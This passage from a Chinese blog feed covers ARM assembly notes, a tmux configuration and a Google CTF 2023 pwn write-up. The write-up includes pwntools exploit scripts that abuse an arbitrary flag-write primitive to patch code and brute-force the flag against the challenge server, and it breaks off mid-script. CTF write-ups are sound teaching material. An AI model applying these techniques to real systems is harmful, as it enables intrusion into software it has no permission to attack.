src="/2023/07/14/arm-asm/image-20230718115628492.png" alt="image-20230718115628492"></p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><ul><li>内存操作数和立即数操作数不能同时出现</li><li>内存操作数至多出现一次</li><li>寄存器操作数总是在最前面</li></ul><p>&lt;opcode&gt; {&lt;cond&gt;} {S} &lt;Rd&gt; , &lt;Rn&gt; { , <shift_op2> }</shift_op2></p><ul><li>opcode:指令  </li><li>cond：条件码 </li><li>S：可选后缀,加上“S”，在指令执行完毕后自动更新CPSR中的条件码标志位的值</li><li>Rd：目标寄存器</li><li>Rn：第一个操作数</li><li>op2：第二个操作数</li></ul><h3 id="条件后缀"><a href="#条件后缀" class="headerlink" title="条件后缀"></a>条件后缀</h3><p><img src="/2023/07/14/arm-asm/image-20230714202416326.png" alt="image-20230714202416326"></p><p><img src="/2023/07/14/arm-asm/image-20230714211613500.png" alt="image-20230714211613500"></p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p>arm里<code>mov</code>指令，通常用于寄存器与寄存器间的数据传输，也可以传递立即数</p><p>mov定长指令的话就不能操作一些特别大的立即数</p><p>mov r0,0x4567 写r0低16位(会对r0高16位做0拓展)</p><p>movt r0,0x1234 写r0高16位</p><p><code>mov r1, #0x10：r1 = 0x10</code></p><p><code>mov r1, r2：r1 = r2</code></p><p><code>mov r1, r2, LSL#2：r1 = r2 &lt;&lt; 2</code> </p><h3 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h3><p><strong>add adds cmn</strong> 有s的既要结果又设置状态寄存器的标志位，不带s的只要运算结果</p><p><code>add r1, r2, #2</code> : <code>r1 = r2 + 2</code>；</p><p><code>add r1,r2,r3</code> : <code>r1=r2+r3</code></p><p><code>add r1, r2, LSL#2</code> : <code>r1 = r2 &lt;&lt; 2</code></p><p><strong>sub subs cmp</strong> </p><p><code>sub r1, r2, r3</code> : <code>r1 = r2 - r3</code></p><p><strong>rsb</strong></p><p><code>rsb r0,r1,#8</code> : <code>r0=8-r1</code></p><p><strong>and</strong></p><p>与，只影响标志位的与指令<strong>tst</strong></p><p><code>and and r0,r1,r2</code> : <code>r0 = r1&amp;r2</code></p><p><strong>bic</strong></p><p><code>bic r0,r1,r2</code> :<code>r0=(~r1)&amp;(~r2)</code></p><p><strong>oor</strong> 或</p><p><strong>eor</strong> </p><p>异或，只影响标志位的异或指令<strong>teq</strong></p><p>实现not取反指令是通过与一个全1的数进行异或</p><p><strong>lsl</strong>(logic shift left)</p><p>逻辑左移</p><p><strong>lsr</strong>(logic shift right)</p><p>逻辑右移</p><p><strong>asr</strong>(arithmatic shift right)</p><p>算数右移，左端用第31位的值来填充</p><p><strong>ROR</strong></p><p>循环右移</p><p><strong>mvn</strong>(Move Not)</p><p><code>MVN r1,r2</code> : <code>r1=~r2</code></p><h3 id="访存指令"><a href="#访存指令" class="headerlink" title="访存指令"></a>访存指令</h3><p><strong>LDR</strong></p><p><code>LDR &#123;cond&#125; Rd, &lt;addr&gt;</code>：加载指定地址(<code>addr</code>)上的数据(字)，放入到<code>Rd</code>寄存器中。</p><p><strong>STR</strong></p><p><code>STR &#123;cond&#125; Rd, &lt;addr&gt;</code>：将<code>Rd</code>寄存器中的数据(字)存储到指定地址(<code>addr</code>)中。</p><p><strong>ADR</strong></p><p>ADR register,exper 一条小范围的地址读取<strong>伪指令</strong>,它将基于PC的相对偏移的地址值读到目标寄存器中</p><p>汇编器首先计算当前PC值（当前指令位置）到exper的距离,然后用一条ADD或者SUB指令替换这条伪指令，</p><p>这个adr在ida帮我们解析好了生成原本的adr伪指令，实际汇编里是add </p><p>ida里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.plt:<span class="number">00010304</span> <span class="number">00</span> C6 <span class="number">8F</span> E2                   ADR     R12, <span class="number">0x1030C</span></span><br><span class="line">.plt:<span class="number">00010308</span> <span class="number">10</span> CA <span class="number">8</span>C E2                   ADD     R12, R12, #<span class="number">0x10000</span></span><br><span class="line">.plt:<span class="number">0001030</span>C <span class="number">04</span> FD BC E5                   LDR     PC, [R12,#(printf_ptr - <span class="number">0x2030C</span>)]! ; __imp_printf</span><br></pre></td></tr></table></figure><p>objdump里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00010304</span> &lt;<span class="built_in">printf</span>@plt&gt;:                                                                                                                                                                                             </span><br><span class="line"><span class="number">10304</span>:       e28fc600        add     ip, pc, #<span class="number">0</span>, <span class="number">12</span>                                                                                                                                                             </span><br><span class="line"><span class="number">10308</span>:       e28cca10        add     ip, ip, #<span class="number">16</span>, <span class="number">20</span> ; <span class="number">0x10000</span>                                                                                                                                                  </span><br><span class="line"><span class="number">1030</span>c:       e5bcfd04        ldr     pc, [ip, #<span class="number">3332</span>]!        ; <span class="number">0xd04</span> </span><br></pre></td></tr></table></figure><p>10304这里的add指令些许奇怪，最右边的12的意思是把0向右做20位循环移位</p><p>10308也是把16向右做20位循环移位</p><p>1030c最后还是从got表里拿了printf地址</p><p><a href="https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200">https://reverseengineering.stackexchange.com/questions/16154/arm-add-instruction-with-shift#:~:text=Unlike%20a%20logical%20shift%2C%20the%20vacant%20bit%20positions,%2B%20%280%20%3C%3C%2012%29%20%3D%20PC%20%2B%200</a></p><p><a href="https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax">https://stackoverflow.com/questions/16207865/weird-gas-arm-syntax</a></p><blockquote><p>记忆技巧：数据在寄存器里处理且寄存器cpu可以直接访问，所以load肯定时从内存加载到寄存器，store时从寄存器存到内存</p></blockquote><p><code>str r2, [r1, #2]</code>：寄存器<code>r2</code>中的值被存放到寄存器<code>r1</code>中的地址加<code>2</code>处的地址中，<code>r1</code>寄存器中的值不变;</p><p><code>str r2, [r1, #2]!</code>：与上一条一样，不过最后<code>r1 += 2</code>，这里的<code>&#123;!&#125;</code>是可选后缀，若选用该后缀，则表示请求回写，也就是当数据传送完毕之后，将最后的地址写入到基址寄存器r1(<code>Rn</code>)中;</p><p><code>ldr r2, [r1], #-2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 -= 2</code>；</p><p><code>str r2, [r1, r3, LSL#2]</code>：将寄存器<code>r2</code>中的值存储到寄存器<code>r1</code>中的地址加上<code>r3</code>寄存器中的值左移两位后的值所指向的地址中；</p><p><code>ldr r2, [r1], r3, LSL#2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 += r3 &lt;&lt; 2</code>.</p><p><code>str r0,[sp,#-4]!</code>: 相当于push r0</p><p><code>ldr r0,[sp],#4</code>:相当于pop r0</p><h3 id="块访存"><a href="#块访存" class="headerlink" title="块访存"></a>块访存</h3><p><a href="https://blog.csdn.net/stephenbruce/article/details/51151147">https://blog.csdn.net/stephenbruce/article/details/51151147</a></p><p><strong>ldm</strong> 依旧是从内存load到寄存器</p><p><strong>stm</strong>从寄存器store到内存</p><p>用于内存描述</p><p> IA  —-&gt;  Increment  After  每次传送<em><strong>后</strong></em>地址<em><strong>加4</strong></em><br> IB  —-&gt;  Increment  Before  每次传送<em><strong>前</strong></em>地址<em><strong>加4</strong></em><br> DA  —-&gt;  Decrement  After  每次传送<em><strong>后</strong></em>地址<em><strong>减4</strong></em><br> DB  —-&gt;  Decrement  Before  每次传送<em><strong>前</strong></em>地址<em><strong>减4</strong></em></p><p>用于堆栈描述 <strong>如果递增，STM将向上，LDM向下</strong></p><p> FA  —-&gt;  Full  Ascending    满递增堆栈  这里full的意思就是sp指向的栈地址里的数据是有用数据<br> FD  —-&gt;  Full  Descending   满递减堆栈<br> EA  —-&gt;  Empty  Ascending    空递增堆栈  这里Empty 的意思就是sp指向的栈地址里的是垃圾数据的 sp+4才是有用的<br> ED  —-&gt;  Empty  Descending  空递减堆栈</p><p>所以ldmfd&#x3D;ldmia，stmfd&#x3D;stmdb</p><p><strong>STMFD   SP!, {R4-R11,LR} 相当于push R4-R11 push LR</strong></p><p><strong>有！的话指令执行完SP值会变，否则不变</strong></p><p><strong>LDMFD   SP!, {R4-R11,LR} 就是pop出栈</strong></p><h3 id="分支跳转"><a href="#分支跳转" class="headerlink" title="分支跳转"></a>分支跳转</h3><p>B imm 相当于x86 jmp</p><p>BL imm 跳过去 且把指令的下一条地址和cpsr寄存器的t位(t为1表示thumb模式)或运算后写入lr寄存器，</p><p>BLX imm blx+立即数的话一定有模式切换 call</p><p>BX reg  <strong>把reg最低一个bit写入cpsr的t位</strong>，然后把reg最低一bit置0，jmp到reg </p><p>BLX reg 比bx+寄存器行为多了一个把指令的下一条地址和cpsr寄存器的t位(t为1表示thumb模式)或运算后写入lr寄存器，不一定有模式切换</p><p>mov pc，reg是不会模式切换的</p><p>BEQ #不等于 想到于 jne<br>BCC #进位清除，应该就是 cmp后，进位为0就跳 感觉就像是 &lt;<br>BGT # 大于<br>BLT #小于<br>BCS #进位设置，应该就是cmp后，有进位 感觉就像是 &gt;&#x3D;</p><h3 id="调用约定和栈帧"><a href="#调用约定和栈帧" class="headerlink" title="调用约定和栈帧"></a>调用约定和栈帧</h3><p>前四个参数r0-r3，多余参数从右向左压栈</p><p>非易变寄存器 r4-r11</p><p>r12导入表寻址</p><p>实际看下来栈帧和x86差不多，只是有的经过了一层寄存器，而且因为定长指令的关系导致可以操作的立即数大小有限(有些情况可以利用循环移位来操作较大的立即数)，所以程序经常可以看到利用pc寄存器和代码段下面存放一些数据来赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00010420</span>                               ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:00010420                               EXPORT main</span><br><span class="line">.text:00010420                               main                                    ; DATA XREF: _start+<span class="number">30</span>↑o</span><br><span class="line">.text:<span class="number">00010420</span>                                                                       ; .got:main_ptr↓o</span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span>                               x= <span class="number">-8</span></span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span> <span class="number">00</span> <span class="number">48</span> <span class="number">2</span>D E9                   PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:<span class="number">00010424</span> <span class="number">04</span> B0 <span class="number">8</span>D E2                   ADD     R11, SP, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010428</span> <span class="number">08</span> D0 <span class="number">4</span>D E2                   SUB     SP, SP, #<span class="number">8</span></span><br><span class="line">.text:<span class="number">0001042</span>C <span class="number">24</span> <span class="number">30</span> <span class="number">9F</span> E5                   LDR     R3, =<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">00010430</span> <span class="number">08</span> <span class="number">30</span> <span class="number">0B</span> E5                   STR     R3, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010434</span> <span class="number">20</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aHelloWorld                ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010438</span> B1 FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0001043</span>C <span class="number">08</span> <span class="number">10</span> <span class="number">1B</span> E5                   LDR     R1, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010440</span> <span class="number">18</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aX                         ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010444</span> AE FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">00010448</span> <span class="number">00</span> <span class="number">30</span> A0 E3                   MOV     R3, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0001044</span>C <span class="number">03</span> <span class="number">00</span> A0 E1                   MOV     R0, R3</span><br><span class="line">.text:<span class="number">00010450</span> <span class="number">04</span> D0 <span class="number">4B</span> E2                   SUB     SP, R11, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010454</span> <span class="number">00</span> <span class="number">88</span> BD E8                   POP     &#123;R11,PC&#125;</span><br><span class="line">.text:<span class="number">00010454</span>                               ; End of function main</span><br><span class="line">.text:<span class="number">00010454</span></span><br><span class="line">.text:<span class="number">00010454</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00010458</span> <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span>                   dword_10458 DCD <span class="number">0x12345678</span>              ; DATA XREF: main+C↑r</span><br><span class="line">.text:<span class="number">0001045</span>C                               ; <span class="type">char</span> *<span class="type">const</span> format</span><br><span class="line">.text:<span class="number">0001045</span>C <span class="number">00</span> <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   format DCD aHelloWorld                  ; DATA XREF: main+<span class="number">14</span>↑r</span><br><span class="line">.text:<span class="number">0001045</span>C                                                                       ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span>                               ; <span class="type">char</span> *<span class="type">const</span> off_10460</span><br><span class="line">.text:<span class="number">00010460</span> <span class="number">0</span>C <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   off_10460 DCD aX                        ; DATA XREF: main+<span class="number">20</span>↑r</span><br><span class="line">.text:<span class="number">00010460</span>                               ; .text ends                            ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span></span><br><span class="line">.fini:<span class="number">00010464</span>                               ; ========================================================</span><br><span class="line">.rodata:<span class="number">00010500</span> <span class="number">68</span> <span class="number">65</span> <span class="number">6</span>C <span class="number">6</span>C <span class="number">6F</span> <span class="number">2</span>C <span class="number">77</span> <span class="number">6F</span> <span class="number">72</span> <span class="number">6</span>C+aHelloWorld DCB <span class="string">&quot;hello,world&quot;</span>,<span class="number">0</span>         ; DATA XREF: main+<span class="number">14</span>↑o</span><br></pre></td></tr></table></figure><p>ida里反汇编出来的<code> LDR     R3, =0x12345678</code>这种带等号的一般都是ida解析好的按pc偏移来寻址的(ldr r3,[pc,#imm])、，ida里按q可以查看原始指令</p><p><img src="/2023/07/14/arm-asm/image-20230719203353466.png" alt="image-20230719203353466"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tmux</title>
      <link href="/2023/07/11/tmux/"/>
      <url>/2023/07/11/tmux/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tmuxcheatsheet.com/">https://tmuxcheatsheet.com/</a></p><p><img src="/2023/07/11/tmux/image-20230922234753859.png" alt="image-20230922234753859"></p><p>前缀prefix:ctrl b</p><p>创建新窗口:pre+c</p><p>切换窗口:pre+number，或pre+p pre+n</p><p>关闭窗口:pre+&amp;</p><p>左右分屏:pre+%</p><p>上下分屏:pre+“</p><p>关闭分屏:pre+x</p><p>最大化分屏:pre+z</p><p>切换分屏:pre+方向键或pre+q+number</p><p>空间预览:pre+w</p><p>脱离工作空间detached:pre+d</p><p>连接工作空间attach:tmux a (tmux attach)</p><p>查看所以工作空间:tmux ls</p><p>连接指定工作空间:tmux attach -t [number]</p><p><strong>~&#x2F;.tmux.conf</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>-option -sa terminal-overrides <span class="string">&quot;,xterm*:Tc&quot;</span></span><br><span class="line"><span class="built_in">set</span> -g <span class="keyword">default</span>-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line"><span class="built_in">set</span>-option -ga terminal-overrides <span class="string">&quot;,*256col*:Tc&quot;</span></span><br><span class="line">setw -g mode-keys vi</span><br><span class="line"><span class="built_in">set</span> -g status-keys vi</span><br><span class="line"><span class="meta"># set-option default-path <span class="string">&quot;$PWD&quot;</span></span></span><br><span class="line"><span class="built_in">set</span> -s escape-time <span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> -sg repeat-time <span class="number">300</span></span><br><span class="line"><span class="built_in">set</span> -s focus-events on</span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line">unbind -T copy-mode-vi MouseDragEnd1Pane</span><br><span class="line">bind v copy-mode # 绑定esc键为进入复制模式</span><br><span class="line">bind -T copy-mode-vi v send-keys -X begin-selection</span><br><span class="line">bind -T copy-mode-vi y send-keys -X copy-selection-and-cancel</span><br><span class="line"><span class="meta"># buffer缓存复制到Linux系统粘贴板</span></span><br><span class="line">bind C-c run <span class="string">&quot; tmux save-buffer - | xclip -i -sel clipboard&quot;</span></span><br><span class="line"># Linux系统粘贴板内容复制到会话</span><br><span class="line">bind C-v run <span class="string">&quot; tmux set-buffer \&quot;$(xclip -o -sel clipboard)\&quot;; tmux paste-buffer&quot;</span></span><br><span class="line"><span class="built_in">set</span> -sg <span class="built_in">exit</span>-empty on</span><br><span class="line"><span class="built_in">set</span> -q -g status-utf8 on</span><br><span class="line"><span class="built_in">set</span> -g history-limit <span class="number">5000</span></span><br><span class="line">setw -q -g utf8 on</span><br><span class="line"><span class="built_in">set</span> -g visual-activity off</span><br><span class="line">setw -g monitor-activity off</span><br><span class="line">setw -g monitor-bell off</span><br><span class="line"># 使用 Ctrl + b + hjkl </span><br><span class="line">bind h select-pane -L                       # 定位到左边窗口的快捷键</span><br><span class="line">bind j select-pane -D                       # 定位到上边窗口的快捷键</span><br><span class="line">bind k select-pane -U                       # 定位到下方窗口的快捷键</span><br><span class="line">bind l select-pane -R                       # 定位到右边窗口的快捷键</span><br><span class="line">bind -r J resize-pane -D <span class="number">5</span></span><br><span class="line">bind -r K resize-pane -U <span class="number">5</span></span><br><span class="line">bind -r L resize-pane -R <span class="number">5</span></span><br><span class="line">bind -r H resize-pane -L <span class="number">5</span></span><br><span class="line">bind -r m resize-pane -Z</span><br><span class="line">#绑定|左右分屏 -上下分屏</span><br><span class="line">unbind %</span><br><span class="line">bind | split-window -h</span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">bind _ split-window -v</span><br><span class="line"><span class="meta">#pulg</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tpm&#x27;</span></span><br><span class="line"><span class="meta">#ctrl +hjkl 不同Pane移动</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;christoomey/vim-tmux-navigator&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;jimeh/tmux-themepack&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-resurrect&#x27;</span> <span class="meta"># persist tmux sessions after computer restart</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-continuum&#x27;</span> <span class="meta"># automatically saves sessions for you every 15 minutes</span></span><br><span class="line"><span class="built_in">set</span> -g @resurrect-capture-pane-contents <span class="string">&#x27;on&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @themepack <span class="string">&#x27;powerline/block/green&#x27;</span></span><br><span class="line"><span class="meta"># set -g status-right <span class="string">&#x27;Continuum status: #&#123;continuum_status&#125;&#x27;</span></span></span><br><span class="line">run <span class="string">&#x27;~/.tmux/plugins/tpm/tpm&#x27;</span> # Initialize Tmux plug manger</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 googlectf pwn</title>
      <link href="/2023/07/10/googlectf-pwn/"/>
      <url>/2023/07/10/googlectf-pwn/</url>
      
        <content type="html"><![CDATA[<h3 id="WRITE-FLAG-WHERE"><a href="#WRITE-FLAG-WHERE" class="headerlink" title="WRITE-FLAG-WHERE"></a>WRITE-FLAG-WHERE</h3><p>本地调试的话Maximum number of open file descriptors最高到1024，所以把dup2 patch为小于1024的值或者修改&#x2F;etc&#x2F;security&#x2F;limits.conf把限制调高</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ulimit -a</span><br><span class="line">Maximum size of core files <span class="title function_">created</span>                           <span class="params">(kB, -c)</span> 0</span><br><span class="line">Maximum size of a process’s data <span class="title function_">segment</span>                     <span class="params">(kB, -d)</span> unlimited</span><br><span class="line">Maximum size of files created by the <span class="title function_">shell</span>                   <span class="params">(kB, -f)</span> unlimited</span><br><span class="line">Maximum size that may be locked into <span class="title function_">memory</span>                  <span class="params">(kB, -l)</span> 628848</span><br><span class="line">Maximum resident <span class="built_in">set</span> <span class="title function_">size</span>                                    <span class="params">(kB, -m)</span> unlimited</span><br><span class="line">Maximum number of open file <span class="title function_">descriptors</span>                          <span class="params">(-n)</span> 1024</span><br><span class="line">Maximum <span class="built_in">stack</span> <span class="title function_">size</span>                                           <span class="params">(kB, -s)</span> 8192</span><br><span class="line">Maximum amount of cpu time in <span class="title function_">seconds</span>                   <span class="params">(seconds, -t)</span> unlimited</span><br><span class="line">Maximum number of processes available to a single <span class="title function_">user</span>           <span class="params">(-u)</span> 19340</span><br><span class="line">Maximum amount of virtual memory available to the <span class="title function_">shell</span>      <span class="params">(kB, -v)</span> unlimited</span><br></pre></td></tr></table></figure><p>把下面丢弃流给nop掉</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">dup2(v8, <span class="number">0</span>);</span><br><span class="line">dup2(v8, <span class="number">1</span>);</span><br><span class="line">dup2(v8, <span class="number">2</span>);</span><br><span class="line">close(v8);</span><br></pre></td></tr></table></figure><blockquote><p><code>/dev/null</code> 是 Unix-like 操作系统中的一个特殊文件，用作数据的位桶或黑洞。它通常被称为 “null 设备”，因为写入到它的任何数据都会被丢弃，不会产生任何影响。</p></blockquote><p>程序给了进程的maps和往进程任意地址写flag的机会，所以只需要改下某位置可以让flag输出即可</p><p>把while循环里的dprintf的地址写入flag即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;wfw1.2023.ctfcompetition.com&#x27;, 1337)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;have a shot.\n&#x27;</span>)</span><br><span class="line">image_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;image_addr: &#x27;</span> + <span class="built_in">hex</span>(image_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>))</span><br><span class="line">sh.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>)).encode())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE2"><a href="#WRITE-FLAG-WHERE2" class="headerlink" title="WRITE-FLAG-WHERE2"></a>WRITE-FLAG-WHERE2</h3><p>逻辑差不多只是dprintf跑到了exit的下面</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001440</span> E8 <span class="number">8B</span> FC FF FF                call    _exit</span><br><span class="line">.text:<span class="number">0000000000001440</span></span><br><span class="line">.text:<span class="number">0000000000001445</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001445</span> <span class="number">8B</span> <span class="number">45</span> F4                      mov     eax, [rbp+var_C]</span><br><span class="line">.text:<span class="number">0000000000001448</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">15</span> <span class="number">86</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>          lea     rdx, aSomehowYouGotH            ; <span class="string">&quot;Somehow you got here??\n&quot;</span></span><br><span class="line">.text:<span class="number">000000000000144F</span> <span class="number">48</span> <span class="number">89</span> D6                      mov     rsi, rdx                        ; fmt</span><br><span class="line">.text:<span class="number">0000000000001452</span> <span class="number">89</span> C7                         mov     edi, eax                        ; fd</span><br><span class="line">.text:<span class="number">0000000000001454</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001459</span> E8 <span class="number">32</span> FC FF FF                call    _dprintf</span><br><span class="line">.text:<span class="number">0000000000001459</span></span><br><span class="line">.text:<span class="number">000000000000145</span>E E8 CD FB FF FF                call    _abort</span><br></pre></td></tr></table></figure><p>我们可以利用flag的格式是CTF{}</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x43&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x54&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x46&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7b&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7d&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">54</span>(T)    push rsp </span><br><span class="line"><span class="number">43</span> <span class="number">54</span>(CT)    push r12</span><br></pre></td></tr></table></figure><p>可以利用push指令改写跳过exit,从后往前写CT,用前一个T覆盖后一个C，即为CTTTT，再改写输出flag即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="meta"># io=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(b<span class="number">&#x27;</span> the fluff\n<span class="number">&#x27;</span>)</span><br><span class="line">image_addr = <span class="type">int</span>(io.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)</span></span><br><span class="line"><span class="string">success(&#x27;</span>image_addr: <span class="string">&#x27; + hex(image_addr))</span></span><br><span class="line"><span class="string">io.recvuntil(b&#x27;</span>[vsyscall]\n<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span>%(image_addr+<span class="number">0x1443</span>-i,<span class="number">2</span>)).encode())</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x20D5</span>, <span class="number">80</span>)).encode())</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>从c0ke师傅周报那里偷学了一手爆破</p><p>思路就是修改<code>if ( (unsigned int)__isoc99_sscanf(buf, &quot;0x%llx %u&quot;, &amp;n[1], n) != 2 || n[0] &gt; 0x7Fu )</code>中0x%llx %u的0为flag中的一位值，下一次输入时以猜测的flag值+x%llx %u的格式来发送数据，如果不是正确的数据就会无法解析数据 (unsigned int)__isoc99_sscanf(buf, “0x%llx %u”, &amp;n[1], n) !&#x3D; 2程序退出，否则正常下一次读入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">def <span class="title function_">leak</span><span class="params">(offset, chr)</span>:    </span><br><span class="line">    sh = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)             </span><br><span class="line">    sh.recvuntil(b<span class="number">&#x27;f</span>luff\n<span class="number">&#x27;</span>)    </span><br><span class="line">    image_addr = 